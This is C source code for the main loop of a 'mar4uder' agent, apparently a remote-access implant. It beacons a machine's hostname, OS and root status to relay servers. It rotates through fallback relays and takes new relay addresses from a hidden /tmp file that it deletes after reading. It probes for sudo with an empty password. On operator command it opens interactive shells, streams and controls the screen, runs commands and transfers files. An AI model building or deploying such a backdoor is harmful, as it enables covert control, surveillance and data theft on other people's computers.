#define _GNU_SOURCE
#include "protocol.h"
#include "pty_session.h"
#include "vnc_server.h"
#include "agent_file_cmd.h"
#include "stream_transport.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <poll.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>

#define HEARTBEAT_INTERVAL_MS 2000
#define SERVER_TIMEOUT_MS     12000
#define MAX_ENDPOINTS         8

struct endpoint {
    char host[128];
    char port[16];
};

static volatile sig_atomic_t g_keep_running = 1;
static struct vnc_framebuffer g_vnc_fb;
static int g_vnc_active = 0;
static int g_vnc_tcp_fd = -1;
static uint64_t g_last_vnc_frame = 0;
static uint64_t g_last_keyframe = 0;

static void sigint_handler(int sig) {
    (void)sig;
    g_keep_running = 0;
}

static uint64_t current_time_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static int parse_endpoints(const char *input, struct endpoint *endpoints, int max_count) {
    int count = 0;
    char buf[1024];
    snprintf(buf, sizeof(buf), "%s", input);

    char *token = strtok(buf, ",; ");
    while (token && count < max_count) {
        char *colon = strrchr(token, ':');
        if (colon) {
            *colon = '\0';
            snprintf(endpoints[count].host, sizeof(endpoints[count].host), "%s", token);
            snprintf(endpoints[count].port, sizeof(endpoints[count].port), "%s", colon + 1);
        } else {
            snprintf(endpoints[count].host, sizeof(endpoints[count].host), "%s", token);
            snprintf(endpoints[count].port, sizeof(endpoints[count].port), "443");
        }
        count++;
        token = strtok(NULL, ",; ");
    }
    return count;
}

static int connect_udp(const char *host, const char *port) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_DGRAM;

    int err = getaddrinfo(host, port, &hints, &res);
    if (err != 0 || !res) {
        return -1;
    }

    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) {
        freeaddrinfo(res);
        return -1;
    }

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd);
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);
    return fd;
}

static int connect_tcp(const char *host, const char *port) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int err = getaddrinfo(host, port, &hints, &res);
    if (err != 0 || !res) return -1;

    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) {
        freeaddrinfo(res);
        return -1;
    }

    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd);
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);
    return fd;
}

/* High-ratio Pixel-RLE compression for 32-bit pixel data in pure C.
 * Compresses identical runs down to 6 bytes.
 * Returns compressed size, or 0 if didn't compress. */
static size_t rle_compress_32(const uint32_t *src, size_t num_pixels, uint8_t *dst, size_t max_dst) {
    size_t out_idx = 0;
    size_t i = 0;

    while (i < num_pixels) {
        uint32_t color = src[i];
        size_t run = 1;
        while (i + run < num_pixels && src[i + run] == color && run < 0x7FFF) {
            run++;
        }

        if (run >= 2) {
            if (out_idx + 6 > max_dst) return 0;
            uint16_t tag = (uint16_t)(0x8000 | run);
            dst[out_idx++] = (tag >> 8) & 0xFF;
            dst[out_idx++] = tag & 0xFF;
            memcpy(dst + out_idx, &color, 4);
            out_idx += 4;
            i += run;
        } else {
            size_t start = i;
            while (i < num_pixels &&
                   (i + 1 >= num_pixels || src[i] != src[i + 1]) &&
                   (i - start) < 0x7FFF) {
                i++;
            }
            size_t lit_count = i - start;
            if (out_idx + 2 + lit_count * 4 > max_dst) return 0;
            uint16_t tag = (uint16_t)lit_count;
            dst[out_idx++] = (tag >> 8) & 0xFF;
            dst[out_idx++] = tag & 0xFF;
            memcpy(dst + out_idx, src + start, lit_count * 4);
            out_idx += lit_count * 4;
        }
    }
    return out_idx;
}

static int check_endpoint_override(struct endpoint *endpoints, int max_eps) {
    const char *paths[] = {"/tmp/.mar4uder_endpoint", "./mar4uder_endpoint", NULL};
    for (int i = 0; paths[i]; i++) {
        if (access(paths[i], R_OK) == 0) {
            FILE *f = fopen(paths[i], "r");
            if (f) {
                char buf[512] = "";
                if (fgets(buf, sizeof(buf) - 1, f)) {
                    char *nl = strpbrk(buf, "\r\n");
                    if (nl) *nl = '\0';
                    fclose(f);
                    unlink(paths[i]);
                    if (strlen(buf) > 0) {
                        return parse_endpoints(buf, endpoints, max_eps);
                    }
                } else {
                    fclose(f);
                    unlink(paths[i]);
                }
            }
        }
    }
    return 0;
}

#define MAX_PTY_SESSIONS 8

struct pty_slot {
    uint32_t session_id;
    struct pty_session pty;
    int in_use;
};

static struct pty_slot *find_session(struct pty_slot *slots, uint32_t sid) {
    if (sid == 0) return NULL;
    for (int i = 0; i < MAX_PTY_SESSIONS; i++) {
        if (slots[i].in_use && slots[i].session_id == sid) {
            return &slots[i];
        }
    }
    return NULL;
}

static struct pty_slot *alloc_session(struct pty_slot *slots, uint32_t sid) {
    /* 1. Reuse existing slot if same session_id */
    for (int i = 0; i < MAX_PTY_SESSIONS; i++) {
        if (slots[i].in_use && slots[i].session_id == sid) {
            return &slots[i];
        }
    }
    /* 2. Find empty slot */
    for (int i = 0; i < MAX_PTY_SESSIONS; i++) {
        if (!slots[i].in_use) {
            memset(&slots[i], 0, sizeof(slots[i]));
            slots[i].pty.master_fd = -1;
            slots[i].session_id = sid;
            slots[i].in_use = 1;
            return &slots[i];
        }
    }
    /* 3. Reclaim terminated session */
    for (int i = 0; i < MAX_PTY_SESSIONS; i++) {
        if (!pty_session_is_alive(&slots[i].pty)) {
            pty_session_close(&slots[i].pty);
            memset(&slots[i], 0, sizeof(slots[i]));
            slots[i].pty.master_fd = -1;
            slots[i].session_id = sid;
            slots[i].in_use = 1;
            return &slots[i];
        }
    }
    /* 4. Evict slot 0 */
    pty_session_close(&slots[0].pty);
    memset(&slots[0], 0, sizeof(slots[0]));
    slots[0].pty.master_fd = -1;
    slots[0].session_id = sid;
    slots[0].in_use = 1;
    return &slots[0];
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    struct endpoint endpoints[MAX_ENDPOINTS];
    int num_endpoints = 0;
    char custom_node_name[64] = "";

    if (argc >= 2) {
        /* Check if legacy format: <host> <port> [node_name] */
        if (argc >= 3 && atoi(argv[2]) > 0 && strchr(argv[1], ':') == NULL) {
            snprintf(endpoints[0].host, sizeof(endpoints[0].host), "%s", argv[1]);
            snprintf(endpoints[0].port, sizeof(endpoints[0].port), "%s", argv[2]);
            num_endpoints = 1;
            if (argc >= 4) snprintf(custom_node_name, sizeof(custom_node_name), "%s", argv[3]);
        } else {
            /* New resilient format: <host:port,host2:port> [node_name] */
            num_endpoints = parse_endpoints(argv[1], endpoints, MAX_ENDPOINTS);
            if (argc >= 3) snprintf(custom_node_name, sizeof(custom_node_name), "%s", argv[2]);
        }
    } else {
        /* 1. Try Environment variables */
        const char *env_relay = getenv("MAR4UDER_RELAY");
        if (env_relay && strlen(env_relay) > 0) {
            num_endpoints = parse_endpoints(env_relay, endpoints, MAX_ENDPOINTS);
        } else {
            /* 2. Try configuration files */
            FILE *cf = fopen("/etc/mar4uder.conf", "r");
            if (!cf) cf = fopen("./mar4uder.conf", "r");
            if (cf) {
                char conf_line[512] = "";
                if (fgets(conf_line, sizeof(conf_line) - 1, cf)) {
                    char *nl = strpbrk(conf_line, "\r\n");
                    if (nl) *nl = '\0';
                    num_endpoints = parse_endpoints(conf_line, endpoints, MAX_ENDPOINTS);
                }
                fclose(cf);
            }
        }

        const char *env_node = getenv("MAR4UDER_NODE");
        if (env_node) snprintf(custom_node_name, sizeof(custom_node_name), "%s", env_node);

        /* 3. Default fallback for local access from any machine */
        if (num_endpoints == 0) {
            num_endpoints = parse_endpoints("127.0.0.1:443", endpoints, MAX_ENDPOINTS);
            printf("[*] No endpoint specified. Defaulting to local relay 127.0.0.1:443\n");
        }
    }

    const char *node_name = (strlen(custom_node_name) > 0) ? custom_node_name : NULL;

    if (num_endpoints == 0) {
        fprintf(stderr, "[-] No valid endpoints specified.\n");
        return 1;
    }

    signal(SIGINT, sigint_handler);
    signal(SIGTERM, sigint_handler);
    signal(SIGPIPE, SIG_IGN);

    struct utsname uts;
    memset(&uts, 0, sizeof(uts));
    uname(&uts);

    char hostname[64] = "unknown";
    gethostname(hostname, sizeof(hostname) - 1);

    char auto_node_id[64];
    if (node_name && strlen(node_name) > 0) {
        snprintf(auto_node_id, sizeof(auto_node_id), "%s", node_name);
    } else {
        snprintf(auto_node_id, sizeof(auto_node_id), "%s-%d", hostname, (int)getpid());
    }

    printf("[*] mar4uder Resilient Agent started\n");
    printf("[*] Node ID:   %s\n", auto_node_id);
    printf("[*] Hostname:  %s (%s %s)\n", hostname, uts.sysname, uts.release);
    printf("[*] Endpoints: %d configured\n", num_endpoints);
    for (int i = 0; i < num_endpoints; i++) {
        printf("    [%d] %s:%s\n", i + 1, endpoints[i].host, endpoints[i].port);
    }


    struct pty_slot sessions[MAX_PTY_SESSIONS];
    memset(sessions, 0, sizeof(sessions));
    for (int i = 0; i < MAX_PTY_SESSIONS; i++) {
        sessions[i].pty.master_fd = -1;
    }

    int current_ep = 0;
    int udp_fd = -1;
    uint32_t active_session_id = 0;
    uint32_t seq_counter = 1;
    uint64_t last_heartbeat = 0;
    uint64_t last_server_reply = current_time_ms();
    int has_root = (geteuid() == 0 || system("echo '' | sudo -S true 2>/dev/null") == 0 || system("sudo -n true 2>/dev/null") == 0);

    char send_buf[sizeof(struct packet_header) + MAX_PAYLOAD_SIZE];
    char recv_buf[sizeof(struct packet_header) + MAX_PAYLOAD_SIZE];

    while (g_keep_running) {
        uint64_t now = current_time_ms();

        /* Dynamic endpoint override check from trigger file or command */
        static uint64_t last_override_check = 0;
        if (now - last_override_check >= 1000) {
            last_override_check = now;
            int new_count = check_endpoint_override(endpoints, MAX_ENDPOINTS);
            if (new_count > 0) {
                printf("[!] Dynamic endpoint switch triggered: %d new endpoint(s) loaded!\n", new_count);
                num_endpoints = new_count;
                current_ep = 0;
                if (udp_fd >= 0) {
                    close(udp_fd);
                    udp_fd = -1;
                }
                if (g_vnc_tcp_fd >= 0) {
                    close(g_vnc_tcp_fd);
                    g_vnc_tcp_fd = -1;
                }
                last_server_reply = now;
                continue;
            }
        }

        /* Ensure UDP connection is established to current endpoint */
        if (udp_fd < 0) {
            printf("[*] Connecting to [%d/%d] %s:%s ...\n",
                   current_ep + 1, num_endpoints,
                   endpoints[current_ep].host, endpoints[current_ep].port);

            udp_fd = connect_udp(endpoints[current_ep].host, endpoints[current_ep].port);
            if (udp_fd < 0) {
                printf("[-] Endpoint %s:%s unreachable. Rotating to next fallback...\n",
                       endpoints[current_ep].host, endpoints[current_ep].port);
                current_ep = (current_ep + 1) % num_endpoints;
                sleep(2);
                continue;
            }
            last_server_reply = now;
            printf("[+] UDP channel ready -> %s:%s\n", endpoints[current_ep].host, endpoints[current_ep].port);
        }

        /* Check if current server has gone silent (Timeout / Drop) */
        if (now - last_server_reply > SERVER_TIMEOUT_MS) {
            printf("[!] Server %s:%s heartbeat timeout (%d ms). Rotating fallback...\n",
                   endpoints[current_ep].host, endpoints[current_ep].port, SERVER_TIMEOUT_MS);
            close(udp_fd);
            udp_fd = -1;
            current_ep = (current_ep + 1) % num_endpoints;
            last_server_reply = now;
            sleep(1);
            continue;
        }

        /* Send keepalive & registration beacon */
        if (now - last_heartbeat >= HEARTBEAT_INTERVAL_MS) {
            last_heartbeat = now;

            struct packet_header *hdr = (struct packet_header *)send_buf;
            hdr->magic = MAR4UDER_MAGIC;
            hdr->version = PROTOCOL_VERSION;
            hdr->type = MSG_REGISTER;
            hdr->flags = has_root ? 0x01 : 0x00;
            hdr->session_id = active_session_id;
            hdr->seq = seq_counter++;

            struct msg_register *reg = (struct msg_register *)(send_buf + sizeof(*hdr));
            memset(reg, 0, sizeof(*reg));
            snprintf(reg->node_id, sizeof(reg->node_id), "%s", auto_node_id);
            snprintf(reg->hostname, sizeof(reg->hostname), "%s", hostname);
            snprintf(reg->os_info, sizeof(reg->os_info), "%.30s %.30s", uts.sysname, uts.release);
            int cur_sw = 1920, cur_sh = 1080;
            stream_transport_get_resolution(&cur_sw, &cur_sh);
            reg->screen_w = (uint16_t)cur_sw;
            reg->screen_h = (uint16_t)cur_sh;

            send(udp_fd, send_buf, sizeof(*hdr) + sizeof(*reg), 0);
        }

        /* Setup poll descriptors */
        struct pollfd pfd[1 + MAX_PTY_SESSIONS];
        int pfd_slot_idx[1 + MAX_PTY_SESSIONS];
        pfd[0].fd = udp_fd;
        pfd[0].events = POLLIN;

        int nfds = 1;
        for (int i = 0; i < MAX_PTY_SESSIONS; i++) {
            if (sessions[i].in_use && sessions[i].pty.is_running && sessions[i].pty.master_fd >= 0) {
                pfd[nfds].fd = sessions[i].pty.master_fd;
                pfd[nfds].events = POLLIN;
                pfd_slot_idx[nfds] = i;
                nfds++;
            }
        }

        int poll_res = poll(pfd, nfds, 100);
        if (poll_res < 0) {
            if (errno == EINTR) continue;
            break;
        }

        /* Inbound UDP packets from Relay */
        if (pfd[0].revents & POLLIN) {
            ssize_t n = recv(udp_fd, recv_buf, sizeof(recv_buf), 0);
            if (n >= (ssize_t)sizeof(struct packet_header)) {
                struct packet_header *hdr = (struct packet_header *)recv_buf;
                if (hdr->magic == MAR4UDER_MAGIC && hdr->version == PROTOCOL_VERSION) {
                    last_server_reply = current_time_ms(); /* Heartbeat ACK */
                    size_t payload_len = n - sizeof(struct packet_header);
                    const uint8_t *payload = (const uint8_t *)(recv_buf + sizeof(struct packet_header));

                    switch (hdr->type) {
                        case MSG_HEARTBEAT:
                            break;

                        case MSG_SESSION_OPEN: {
                            uint32_t sess_id = hdr->session_id;
                            active_session_id = sess_id;
                            uint16_t cols = 80;
                            uint16_t rows = 24;
                            if (payload_len >= sizeof(struct msg_resize)) {
                                const struct msg_resize *rs = (const struct msg_resize *)payload;
                                if (rs->cols > 0) cols = rs->cols;
                                if (rs->rows > 0) rows = rs->rows;
                            }

                            struct pty_slot *slot = alloc_session(sessions, sess_id);
                            if (slot) {
                                if (slot->pty.is_running) {
                                    printf("[*] Reinitializing PTY session id=%u to ensure clean prompt.\n", sess_id);
                                    pty_session_close(&slot->pty);
                                }
                                printf("[+] Spawning fresh PTY session (id=%u, cols=%u, rows=%u)\n",
                                       sess_id, cols, rows);
                                pty_session_init(&slot->pty, NULL, cols, rows);
                            }
                            break;
                        }

                        case MSG_PTY_RESIZE: {
                            if (payload_len >= sizeof(struct msg_resize)) {
                                const struct msg_resize *rs = (const struct msg_resize *)payload;
                                struct pty_slot *slot = find_session(sessions, hdr->session_id);
                                if (slot && slot->pty.is_running) {
                                    pty_session_resize(&slot->pty, rs->cols, rs->rows);
                                }
                            }
                            break;
                        }

                        case MSG_PTY_DATA: {
                            struct pty_slot *slot = find_session(sessions, hdr->session_id);
                            if (!slot && hdr->session_id == 0) {
                                for (int i = 0; i < MAX_PTY_SESSIONS; i++) {
                                    if (sessions[i].in_use && sessions[i].pty.is_running) {
                                        slot = &sessions[i];
                                        break;
                                    }
                                }
                            }
                            if (slot && slot->pty.is_running && payload_len > 0) {
                                pty_session_write(&slot->pty, payload, payload_len);
                            }
                            break;
                        }

                        case MSG_SESSION_CLOSE: {
                            struct pty_slot *slot = find_session(sessions, hdr->session_id);
                            if (slot) {
                                printf("[*] Operator detached. Closing PTY session id=%u\n", slot->session_id);
                                pty_session_close(&slot->pty);
                                slot->in_use = 0;
                                slot->session_id = 0;
                            }
                            break;
                        }

                        case MSG_VNC_START: {
                            if (!g_vnc_active) {
                                if (vnc_fb_init(&g_vnc_fb) == 0) {
                                    g_vnc_active = 1;
                                    printf("[+] VNC stream activated (%dx%d, %d bpp)\n",
                                           g_vnc_fb.width, g_vnc_fb.height, g_vnc_fb.bpp);
                                }
                            }
                            if (g_vnc_active) {
                                g_last_keyframe = 0; /* Force immediate full keyframe transmission */
                                /* Force full refresh on start */
                                if (g_vnc_fb.prev_pixels) {
                                    memset(g_vnc_fb.prev_pixels, 0xFF, (size_t)g_vnc_fb.width * g_vnc_fb.height * 4);
                                }

                                /* Connect reliable TCP VNC stream */
                                if (g_vnc_tcp_fd >= 0) {
                                    close(g_vnc_tcp_fd);
                                    g_vnc_tcp_fd = -1;
                                }
                                g_vnc_tcp_fd = connect_tcp(endpoints[current_ep].host, endpoints[current_ep].port);
                                if (g_vnc_tcp_fd >= 0) {
                                    uint8_t hs[75];
                                    uint32_t magic = MAR4UDER_MAGIC;
                                    memcpy(hs, &magic, 4);
                                    hs[4] = PROTOCOL_VERSION;
                                    hs[5] = MSG_VNC_START;
                                    memset(hs + 6, 0, 64);
                                    snprintf((char *)(hs + 6), 64, "%s", auto_node_id);
                                    uint16_t send_w = g_vnc_fb.orig_width > 0 ? g_vnc_fb.orig_width : g_vnc_fb.width;
                                    uint16_t send_h = g_vnc_fb.orig_height > 0 ? g_vnc_fb.orig_height : g_vnc_fb.height;
                                    hs[70] = (send_w >> 8) & 0xFF;
                                    hs[71] = send_w & 0xFF;
                                    hs[72] = (send_h >> 8) & 0xFF;
                                    hs[73] = send_h & 0xFF;
                                    hs[74] = g_vnc_fb.bpp;
                                    send(g_vnc_tcp_fd, hs, 75, MSG_NOSIGNAL);
                                    printf("[+] VNC TCP stream connected to %s:%s (Native: %dx%d)\n", endpoints[current_ep].host, endpoints[current_ep].port, send_w, send_h);
                                }

                                struct packet_header *vhdr = (struct packet_header *)send_buf;
                                vhdr->magic = MAR4UDER_MAGIC;
                                vhdr->version = PROTOCOL_VERSION;
                                vhdr->type = MSG_VNC_START;
                                vhdr->flags = 0;
                                vhdr->session_id = active_session_id;
                                vhdr->seq = seq_counter++;

                                uint16_t send_w = g_vnc_fb.orig_width > 0 ? g_vnc_fb.orig_width : g_vnc_fb.width;
                                uint16_t send_h = g_vnc_fb.orig_height > 0 ? g_vnc_fb.orig_height : g_vnc_fb.height;
                                uint8_t *pld = (uint8_t *)(send_buf + sizeof(*vhdr));
                                pld[0] = (send_w >> 8) & 0xFF;
                                pld[1] = send_w & 0xFF;
                                pld[2] = (send_h >> 8) & 0xFF;
                                pld[3] = send_h & 0xFF;
                                pld[4] = g_vnc_fb.bpp;
                                send(udp_fd, send_buf, sizeof(*vhdr) + 5, 0);
                            }
                            break;
                        }

                        case MSG_VNC_STOP: {
                            if (g_vnc_tcp_fd >= 0) {
                                close(g_vnc_tcp_fd);
                                g_vnc_tcp_fd = -1;
                            }
                            if (g_vnc_active) {
                                vnc_fb_close(&g_vnc_fb);
                                g_vnc_active = 0;
                                printf("[*] VNC stream stopped\n");
                            }
                            break;
                        }

                        case MSG_VNC_INPUT: {
                            if (payload_len >= sizeof(struct msg_vnc_input)) {
                                const struct msg_vnc_input *inp = (const struct msg_vnc_input *)payload;
                                vnc_input_inject(inp->event_type, inp->button_mask, inp->x, inp->y, inp->key_sym, inp->down_flag);
                            } else {
                                printf("[-] MSG_VNC_INPUT invalid payload_len=%zu (expected %zu)\n", payload_len, sizeof(struct msg_vnc_input));
                            }
                            break;
                        }

                        case MSG_STREAM_START: {
                            char srv[64] = {0};
                            uint16_t port = 8554;
                            char name[64] = "desktop";
                            uint16_t req_w = 0, req_h = 0, req_fps = 30, req_br = 2000;
                            uint8_t req_preset = 0;

                            if (payload_len >= 130 /* base fields size */) {
                                const struct msg_stream_start *req = (const struct msg_stream_start *)payload;
                                if (req->server_host[0] != '\0') {
                                    snprintf(srv, sizeof(srv), "%s", req->server_host);
                                }
                                if (req->rtsp_port > 0) {
                                    port = req->rtsp_port;
                                }
                                if (req->stream_name[0] != '\0') {
                                    snprintf(name, sizeof(name), "%s", req->stream_name);
                                }
                                if (payload_len >= sizeof(struct msg_stream_start)) {
                                    req_w = req->width;
                                    req_h = req->height;
                                    if (req->fps > 0) req_fps = req->fps;
                                    if (req->bitrate_kb > 0) req_br = req->bitrate_kb;
                                    req_preset = req->preset;
                                }
                            }
                            if (srv[0] == '\0') {
                                snprintf(srv, sizeof(srv), "%s", endpoints[current_ep].host);
                            }

                            printf("[+] MSG_STREAM_START: starting WebRTC/RTSP stream -> rtsp://%s:%u/%s (res=%ux%u, fps=%u, br=%uk, preset=%u)\n",
                                   srv, (unsigned int)port, name, req_w, req_h, req_fps, req_br, req_preset);
                            stream_transport_start_ext(srv, port, name, req_w, req_h, req_fps, req_br, req_preset);
                            break;
                        }

                        case MSG_STREAM_STOP: {
                            printf("[*] MSG_STREAM_STOP: stopping stream transport\n");
                            stream_transport_stop();
                            break;
                        }

                        case MSG_CMD_EXEC:
                        case MSG_FS_LIST_REQ:
                        case MSG_FILE_PUSH_START:
                        case MSG_FILE_PUSH_CHUNK:
                        case MSG_FILE_PUSH_END:
                        case MSG_FILE_PULL_REQ:
                            handle_file_cmd_packet(udp_fd, hdr, payload, payload_len);
                            break;

                        default:
                            break;
                    }
                }
            }
        }

        /* PTY master output -> forward to Relay via UDP per session */
        for (int j = 1; j < nfds; j++) {
            if (pfd[j].revents & POLLIN) {
                int s_idx = pfd_slot_idx[j];
                struct pty_slot *slot = &sessions[s_idx];
                char pty_data[MAX_PAYLOAD_SIZE];
                ssize_t n = pty_session_read(&slot->pty, pty_data, sizeof(pty_data));
                if (n > 0) {
                    struct packet_header *hdr = (struct packet_header *)send_buf;
                    hdr->magic = MAR4UDER_MAGIC;
                    hdr->version = PROTOCOL_VERSION;
                    hdr->type = MSG_PTY_DATA;
                    hdr->flags = 0;
                    hdr->session_id = slot->session_id;
                    hdr->seq = seq_counter++;

                    memcpy(send_buf + sizeof(*hdr), pty_data, n);
                    send(udp_fd, send_buf, sizeof(*hdr) + n, 0);
                } else if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                    /* Non-blocking read */
                } else {
                    /* Shell exited explicitly by user typing 'exit' */
                    printf("[-] User exited shell (session id=%u). Destroying PTY.\n", slot->session_id);
                    pty_session_close(&slot->pty);

                    struct packet_header *hdr = (struct packet_header *)send_buf;
                    hdr->magic = MAR4UDER_MAGIC;
                    hdr->version = PROTOCOL_VERSION;
                    hdr->type = MSG_SESSION_CLOSE;
                    hdr->flags = 0;
                    hdr->session_id = slot->session_id;
                    hdr->seq = seq_counter++;
                    send(udp_fd, send_buf, sizeof(*hdr), 0);

                    slot->in_use = 0;
                    slot->session_id = 0;
                }
            }
        }

        /* 3. VNC screen streaming -> forward dirty tiles via reliable TCP stream */
        /* WebRTC / RTSP ultra-low-latency stream transport watchdog tick */
        stream_transport_tick();

        if (g_vnc_active && (now - g_last_vnc_frame >= 60)) {
            g_last_vnc_frame = now;
            vnc_fb_update(&g_vnc_fb, auto_node_id);

            /* Ensure TCP stream connection is open */
            if (g_vnc_tcp_fd < 0) {
                g_vnc_tcp_fd = connect_tcp(endpoints[current_ep].host, endpoints[current_ep].port);
                if (g_vnc_tcp_fd >= 0) {
                    uint8_t hs[75];
                    uint32_t magic = MAR4UDER_MAGIC;
                    memcpy(hs, &magic, 4);
                    hs[4] = PROTOCOL_VERSION;
                    hs[5] = MSG_VNC_START;
                    memset(hs + 6, 0, 64);
                    snprintf((char *)(hs + 6), 64, "%s", auto_node_id);
                    uint16_t send_w = g_vnc_fb.orig_width > 0 ? g_vnc_fb.orig_width : g_vnc_fb.width;
                    uint16_t send_h = g_vnc_fb.orig_height > 0 ? g_vnc_fb.orig_height : g_vnc_fb.height;
                    hs[70] = (send_w >> 8) & 0xFF;
                    hs[71] = send_w & 0xFF;
                    hs[72] = (send_h >> 8) & 0xFF;
                    hs[73] = send_h & 0xFF;
                    hs[74] = g_vnc_fb.bpp;
                    send(g_vnc_tcp_fd, hs, 75, MSG_NOSIGNAL);
                    if (g_vnc_fb.prev_pixels) {
                        memset(g_vnc_fb.prev_pixels, 0xFF, (size_t)g_vnc_fb.width * g_vnc_fb.height * 4);
                    }
                }
            }

            if (g_vnc_tcp_fd >= 0) {
                int unsent = 0;
                if (ioctl(g_vnc_tcp_fd, TIOCOUTQ, &unsent) == 0 && unsent > 65536) {
                    /* Upstream connection is still transmitting previous batch.
                     * Skip sending new tiles this cycle to prevent queue buildup.
                     * Dirty tiles remain preserved in prev_pixels comparison. */
                    continue;
                }

                uint16_t tile_w = 128;
                uint16_t tile_h = 128;
                static uint32_t raw_tile[128 * 128];
                static uint8_t comp_tile[128 * 128 * 4 + 128];
                static uint8_t tile_pkt[12 + 128 * 128 * 4 + 128];

                /* Full keyframe only on first frame of connection */
                int force_keyframe = (g_last_keyframe == 0);
                if (force_keyframe) g_last_keyframe = now;

                for (uint16_t ty = 0; ty < g_vnc_fb.height; ty += tile_h) {
                    uint16_t cur_h = (ty + tile_h > g_vnc_fb.height) ? (g_vnc_fb.height - ty) : tile_h;
                    for (uint16_t tx = 0; tx < g_vnc_fb.width; tx += tile_w) {
                        uint16_t cur_w = (tx + tile_w > g_vnc_fb.width) ? (g_vnc_fb.width - tx) : tile_w;

                        int dirty = force_keyframe;
                        uint32_t *cur = (uint32_t *)g_vnc_fb.pixels;
                        uint32_t *prev = (uint32_t *)g_vnc_fb.prev_pixels;
                        if (!dirty && prev) {
                            for (uint16_t r = 0; r < cur_h; r++) {
                                size_t off = (size_t)(ty + r) * g_vnc_fb.width + tx;
                                if (memcmp(cur + off, prev + off, cur_w * 4) != 0) {
                                    dirty = 1;
                                    break;
                                }
                            }
                        }

                        if (dirty) {
                            if (prev) {
                                for (uint16_t r = 0; r < cur_h; r++) {
                                    size_t off = (size_t)(ty + r) * g_vnc_fb.width + tx;
                                    memcpy(prev + off, cur + off, cur_w * 4);
                                }
                            }

                            for (uint16_t r = 0; r < cur_h; r++) {
                                size_t off = (size_t)(ty + r) * g_vnc_fb.width + tx;
                                memcpy(raw_tile + (r * cur_w), cur + off, cur_w * 4);
                            }

                            size_t num_px = (size_t)cur_w * cur_h;
                            size_t raw_len = num_px * 4;
                            size_t comp_len = rle_compress_32(raw_tile, num_px, comp_tile, sizeof(comp_tile));

                            uint8_t comp_flag = 0;
                            uint16_t payload_len = 0;
                            const void *payload_ptr = NULL;

                            if (comp_len > 0 && comp_len < raw_len) {
                                comp_flag = 1;
                                payload_len = (uint16_t)comp_len;
                                payload_ptr = comp_tile;
                            } else {
                                comp_flag = 0;
                                payload_len = (uint16_t)raw_len;
                                payload_ptr = raw_tile;
                            }

                            tile_pkt[0] = (tx >> 8) & 0xFF; tile_pkt[1] = tx & 0xFF;
                            tile_pkt[2] = (ty >> 8) & 0xFF; tile_pkt[3] = ty & 0xFF;
                            tile_pkt[4] = (cur_w >> 8) & 0xFF; tile_pkt[5] = cur_w & 0xFF;
                            tile_pkt[6] = (cur_h >> 8) & 0xFF; tile_pkt[7] = cur_h & 0xFF;
                            tile_pkt[8] = comp_flag;
                            tile_pkt[9] = 0;
                            tile_pkt[10] = (payload_len >> 8) & 0xFF; tile_pkt[11] = payload_len & 0xFF;

                            memcpy(tile_pkt + 12, payload_ptr, payload_len);

                            size_t pkt_len = 12 + payload_len;
                            ssize_t sent = send(g_vnc_tcp_fd, tile_pkt, pkt_len, MSG_NOSIGNAL);
                            if (sent <= 0) {
                                close(g_vnc_tcp_fd);
                                g_vnc_tcp_fd = -1;
                                g_last_keyframe = 0;
                                g_last_vnc_frame = now + 1500;
                                break;
                            }
                        }
                    }
                    if (g_vnc_tcp_fd < 0) break;
                }
            }
        }
    }

    if (g_vnc_tcp_fd >= 0) {
        close(g_vnc_tcp_fd);
        g_vnc_tcp_fd = -1;
    }
    if (g_vnc_active) {
        vnc_fb_close(&g_vnc_fb);
    }
    stream_transport_stop();
    for (int i = 0; i < MAX_PTY_SESSIONS; i++) {
        if (sessions[i].in_use && sessions[i].pty.is_running) {
            pty_session_close(&sessions[i].pty);
        }
    }
    file_cmd_cleanup();
    if (udp_fd >= 0) {
        close(udp_fd);
    }
    return 0;
}
